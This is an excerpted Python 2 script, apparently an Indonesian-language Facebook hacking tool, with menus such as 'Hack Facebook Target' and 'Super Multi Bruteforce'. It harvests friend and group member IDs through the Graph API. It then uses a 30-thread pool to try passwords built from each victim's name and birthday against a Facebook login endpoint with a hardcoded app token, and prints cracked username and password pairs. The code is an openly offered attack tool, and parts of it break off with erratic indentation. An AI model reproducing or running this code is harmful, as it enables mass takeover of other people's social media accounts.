...
def tik():
    ...
    for i in range(100):
        time.sleep(0.1)
        sys.stdout.write('\r\033[31;1m[!]Waitt gan \x1b[1;97m' + animation[(i % len(animation))])
        sys.stdout.flush()
...
def menu_hack():
    ...
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║1. Hack Facebook Target )'
    print '║2. Multi Bruteforce Facebook'
    print '║3. Super Multi Bruteforce Facebook'
    print '║4. BruteForce Target )'
    print '║5. Yahoo Clone'
    print '║6. Ambil ID/Email/HP'
...
def mini():
    ...
    try:
        ...
        try:
            ...
            time.sleep(1)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease tunguu \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            pz1 = a['first_name'] + '123' + '12345'
...
def super():
    ...
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '║->1. Crack with from Friends'
    print '║->2. Crack with from Group'
    print '║->3. Crack with from File'
    print '║->0. Kembali'
    print '\x1b[1;37;40m║'
    pilih_super()
...
def pilih_super():
    ...
    if peak == '':
        ...
        if peak == '1':
            ...
            if peak == '2':
                ...
                print logo
                print 52 * '\x1b[1;97m\xe2\x95\x90'
                idg = raw_input('\x1b[1;91m[?]ID Group   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '[?]Name grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
    ...
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\r\x1bCrack \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.01)
    ...
    def main(arg):
        ...
        try:
                ...
                if 'access_token' in q:
                    print '\x1b[1;97m\x1b[1;92m[Ok]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']
                else:
                    if 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m\x1b[1;93m[?]\x1b[1;97m ' + user + ' | ' + pass1 + ' --> ' + b['name']
                    else:
                            pass2 = b['firs_name'] + '12345' + '123456'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;97m\x1b[1;92m[Ok]\x1b[1;97m ' + user + ' | ' + pass2 + ' --> ' + b['name']
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m\x1b[1;93m[?]\x1b[1;97m '+ user + ' | ' + pass2 + ' --> ' + b['name']
                                        ...
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;97m\x1b[1;92m[Gud]\x1b[1;97m ' + user + ' | ' + pass3 + ' --> ' + b['name']
                                        else:
                                            if 'www.facebook.com' in q['error_msg']:
						    ...
						    pass4 = b['last_name'] + '12345'
                                                    ...
                                                    if 'access_token' in q:
                                                        ...
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[1;97m\x1b[1;93m[cie apes]\x1b[1;97m ' + user + ' | ' + pass4 + ' --> ' + b['name']
                    					else:
                                                                birthday = b['birthday']
                                                                    ...
                                                                    if 'www.facebook.com' in q['error_msg']:
                                                                        print '\x1b[1;97m[\x1b[1;93m[?]\x1b[1;97m ' + user + ' | ' + pass5 + ' --> ' + b['name']
                                                                            ...
                                                                            if 'access_token' in q:
                                                                                ...
                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                    print '\x1b[1;97m\x1b[1;93m[cie apes]\x1b[1;97m ' + user + ' | ' + pass6 + ' --> ' + b['name']
    ...
    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mDone Ya gan ('
